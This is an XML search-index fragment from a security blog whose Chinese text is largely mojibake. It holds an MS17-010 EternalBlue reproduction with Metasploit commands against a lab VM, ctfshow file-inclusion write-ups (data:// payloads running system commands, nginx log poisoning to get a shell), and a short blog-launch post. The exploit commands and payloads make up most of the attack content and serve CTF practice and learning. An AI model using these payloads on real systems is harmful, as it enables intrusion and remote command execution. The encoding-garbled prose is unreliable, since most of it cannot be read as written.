        <content type="html"><![CDATA[<h6 id="æ¼æ´æè¿°ï¼š"><a href="#æ¼æ´æè¿°ï¼š" class="headerlink" title="æ¼æ´æè¿°ï¼š"></a>æ¼æ´æè¿°ï¼š</h6><p>æ°¸æ’ä¹‹è“ï¼ˆEternalblueï¼‰æ˜¯æŒ‡2017å¹´4æœˆ14æ—¥æ™šï¼Œé»‘å®¢å›¢ä½“Shadow Brokersï¼ˆå½±å­ç»çºªäººï¼‰å…¬å¸ƒä¸€å¤§æ‰¹ç½‘ç»œæ”»å‡»å·¥å…·ï¼Œå…¶ä¸­åŒ…å«â€œæ°¸æ’ä¹‹è“â€å·¥å…·ï¼Œâ€œæ°¸æ’ä¹‹è“â€åˆ©ç”¨Windowsç³»ç»Ÿçš„SMBæ¼æ´å¯ä»¥è·å–ç³»ç»Ÿæœ€é«˜æƒé™ã€‚</p><p>åŸç†ï¼š</p><p>é€šè¿‡TCPç«¯å£445å’Œ139æ¥åˆ©ç”¨SMBv1å’ŒNBTä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œé€šè¿‡æ¶æ„ä»£ç æ‰«æå¹¶æ”»å‡»å¼€æ”¾445æ–‡ä»¶å…±äº«ç«¯å£çš„Windowsä¸»æœºï¼Œåªè¦ç”¨æˆ·ä¸»æœºåœ¨çº¿ï¼Œå³å¯é€šè¿‡è¯¥æ¼æ´ï¼Œæ§åˆ¶ç”¨æˆ·çš„ä¸»æœºã€‚</p><p>æµ‹è¯•ç¯å¢ƒï¼š</p><p>æ”»å‡»æœºï¼škali</p><p>é¶æœºï¼šWindows7 (ipï¼š192.168.102.128ï¼›åœ¨è¢«æ¸—é€è¿‡ç¨‹ä¸­éœ€å…¨ç¨‹å…³é—­é˜²ç«å¢™)</p><p>å¤ç°è¿‡ç¨‹ï¼š</p><p>1.å…ˆä½¿ç”¨nmapå¯¹ç›®æ ‡ipè¿›è¡Œç«¯å£æ‰«æï¼ŒæŸ¥çœ‹445ç«¯å£æ˜¯å¦æœ‰å¼€æ”¾</p><p><img src="/images/ms17_010a.png"></p><p>2.è¿›å…¥msfconsoleï¼Œæœç´¢ms17-010</p><p><img src="/images/ms17_010b.png"></p><p>æœ‰ä¸¤ä¸ªå·¥å…·å¯ä»¥ä½¿ç”¨ï¼Œauxiliary/scanner/smb/smb_ms17_010æ˜¯æ‰«ææ¨¡å—ï¼›exploit/windows/smb/ms17_010_eternalblueæ˜¯æ¸—é€æ¨¡å—ï¼›ä¸€èˆ¬å…ˆè¿›è¡Œæ‰«æï¼Œå†è¿›è¡Œæ¸—é€ã€‚</p><p>3.ä½¿ç”¨æ‰«ææ¨¡å—å¯¹é¶æœºè¿›è¡Œæ‰«æ</p><pre class="line-numbers language-none"><code class="language-none">è¿›å…¥æ‰«ææ¨¡å—use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010è®¾ç½®ç›®æ ‡ipset rhosts 192.168.102.128å¼€å§‹æ‰«ærun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/ms17_010c.png"></p><p>å¯ä»¥å‘ç°ç›®æ ‡ipç¡®å®å­˜åœ¨æ¼æ´é£é™©</p><p>4.ä½¿ç”¨æ¸—é€æ¨¡å—å¯¹ç›®æ ‡è¿›è¡Œæ¸—é€</p><pre class="line-numbers language-none"><code class="language-none">è¿›å…¥æ¸—é€æ¨¡å—use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblueæŸ¥çœ‹å½“å‰æ¨¡å—æ‰€éœ€å‚æ•°show optionsè®¾ç½®ç›®æ ‡ipset rhosts 192.168.102.128å¼€å§‹æ¸—é€run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/ms17_010d.png"></p><p>5.åœ¨æ‰§è¡Œå®Œrunåï¼Œå¼€å¯äº†ä¸€ä¸ªreverse tcpç›‘å¬å™¨æ¥ç›‘å¬æœ¬åœ°çš„4444ç«¯å£ï¼Œè¿è¡ŒæˆåŠŸåä¼šè¿›å…¥ä¸€ä¸ªmeterpreterä¼šè¯ï¼Œå¯ä»¥é€šè¿‡æ­¤ä¼šè¯æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€ææƒã€è·å–æ•æ„Ÿä¿¡æ¯ç­‰ï¼›è¾“å…¥shellåå³å¯åˆ‡æ¢åˆ°ç›®æ ‡ä¸»æœºçš„windows shell</p><p><img src="/images/ms17_010f.png"></p><p>å¯¹é¶æœºæ‰§è¡Œç›¸å…³å‘½ä»¤ï¼Œå‘ç°æˆåŠŸæ‰§è¡Œã€‚</p><p><img src="/images/ms17_010g.png"></p><h6 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h6><p>ä»¥ä¸Šä¾¿æ˜¯ms17_010æ¼æ´çš„å¤ç°äº†ï¼Œè¿‡ç¨‹ç›¸å¯¹ç®€å•ï¼Œä½†å´è·å¾—äº†æå¤§çš„ç³»ç»Ÿæƒé™ï¼Œç”±æ­¤å¯è§ç³»ç»Ÿè‡ªåŠ¨æ›´æ–°çš„é‡è¦æ€§äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ms17_010æ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF_SHOWä¹‹webå…¥é—¨éƒ¨åˆ†wp</title>
      <link href="/2022/02/26/jian-web1/"/>
      <url>/2022/02/26/jian-web1/</url>
      
        <content type="html"><![CDATA[<h3 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h3><h4 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŸ¥çœ‹ç›®å½•</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'glob:///*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å‘ç° include åŒ…å«å‡½æ•°ï¼Œé€‰æ‹©ä½¿ç”¨ data ä¼ªåè®® data://text/plain,æ„é€  payloadï¼š?file=data://text/plain,<?php phpinfo();?>æˆåŠŸå‡ºç° phpinfo()é¡µé¢</p><p><img src="/images/web_78a.png"></p><p>ç„¶åè¾“å¦‚æŸ¥è¯¢ç›®å½•çš„æŒ‡ä»¤ï¼Œå‘ç°æœ‰ flag.php æ–‡ä»¶ï¼š?file=data://text/plain,<?php system("ls");?></p><p><img src="/images/web_78b.png">]</p><p>ä½¿ç”¨ tac å‘½ä»¤è¯»å–æ–‡ä»¶ï¼ŒæˆåŠŸè¯»å– flag:ctfshow{7bc171e1-06c8-4e6c-8e13-33585ea3d0be}</p><h4 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?phpif(isset($_GET[&#39;file&#39;]))&#123;    $file &#x3D; $_GET[&#39;file&#39;];    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‘ç°è¿™æ¬¡å¯¹ php è¿›è¡Œäº†è¿‡æ»¤ï¼Œä½†å¯ä»¥ä½¿ç”¨ php çŸ­æ ‡è®°<?=?>å’Œ?å ä½ç¬¦è¿›è¡Œè¯»å‡º</p><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D;system(&quot;tac flag.???&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆåŠŸè¯»å‡º flagï¼šctfshow{e8c8a34c-8e08-4b8e-92ac-6387a53ddb92}</p><h4 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?phpif(isset($_GET[&#39;file&#39;]))&#123;    $file &#x3D; $_GET[&#39;file&#39;];    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ¬¡å‘ç°è¿˜å¯¹ data è¿›è¡Œäº†æ›¿æ¢ï¼ŒåŸæœ¬æƒ³æƒ³ä½¿ç”¨çš„æ˜¯ï¼š</p><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;Php:&#x2F;&#x2F;inputpost: &lt;?php system(&quot;ls&quot;)?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä½†ä¸çŸ¥ä¸ºä»€ä¹ˆæ²¡æœ‰æ˜¾ç¤ºå‡ºæ¥ï¼Œæ‰€ä»¥æŸ¥çœ‹äº† hintï¼Œç»™çš„æç¤ºæ˜¯è®¿é—® nginx å’Œ apache ä¸‹çš„æ—¥å¿—æ–‡ä»¶ï¼Œgetshell çš„æ–¹æ³•ï¼Œpayload å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;489ea2b8-3fb5-4cc6-b9d6-7fc5608c320b.challenge.ctf.show&#x2F;?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½¿ç”¨ bp æŠ“åŒ…ï¼Œå°†ğŸå†™å†UAå¤´é‡Œ</p><p><img src="/images/web_80a.png"></p><p><img src="/images/web_80b.png"></p><p><img src="/images/web_80c.png"></p><h4 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?phpif(isset($_GET[&#39;file&#39;]))&#123;    $file &#x3D; $_GET[&#39;file&#39;];    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‘ç°è¿™æ¬¡è¿˜å°†å†’å·ç»™è¿‡æ»¤äº†ï¼Œä¸è¿‡å´å¯ä»¥ç»§ç»­è®¿é—® var/log/nginx/access.log æ—¥å¿—æ–‡ä»¶è¿›è¡Œä¼ ğŸ,å¾—åˆ°flag</p><p><img src="/images/web_81.png"></p><h4 id="web82-86"><a href="#web82-86" class="headerlink" title="web82-86"></a>web82-86</h4><p>æ¡ä»¶ç«äº‰ï¼Œé™åˆ¶äº†å¹¶å‘ï¼Œå…ˆåšåé¢çš„ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ctf_show </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå…¥é—¨_æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¼€å§‹</title>
      <link href="/2022/02/26/article-title/"/>
      <url>/2022/02/26/article-title/</url>
      
        <content type="html"><![CDATA[<p>ç»å†äº†ä¸¤å¤©çš„æ­å»ºï¼Œä¸æ–­çš„æ‘¸ç´¢å’Œç™¾åº¦è°·æ­Œæœç´¢ï¼Œè‡ªå·±çš„åšå®¢ä¹Ÿæ€»ç®—æ˜¯æ­å»ºæˆåŠŸäº†ï¼Œè™½ç„¶è¿˜å¾ˆèœï¼Œä½†ä¹Ÿæ€»ç®—æ˜¯è·¨å‡ºäº†ç¬¬ä¸€æ­¥ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ­å»º </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¿è¡Œä¸­ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
